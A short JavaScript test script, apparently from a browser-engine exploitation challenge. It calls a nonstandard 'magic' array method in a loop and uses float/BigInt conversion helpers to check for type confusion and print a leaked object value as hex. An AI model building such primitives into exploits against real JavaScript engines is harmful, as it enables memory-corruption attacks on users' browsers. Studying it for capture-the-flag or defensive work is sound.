// Simple test to verify type confusion
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u64 = new BigUint64Array(buf);

function d2u(d) {
    f64[0] = d;
    return u64[0];
}

for (let i = 0; i < 0x10000; i++) {
    let a = [1.1, 2.2];
    let b = [{}, {}];
    
    a.magic(a.length, 33);
    
    if (typeof b[0] === 'number') {
        console.log("SUCCESS! Type confusion achieved at iteration " + i);
        console.log("b[0] =", b[0]);
        console.log("b[0] as hex:", '0x' + d2u(b[0]).toString(16));
        break;
    }
}
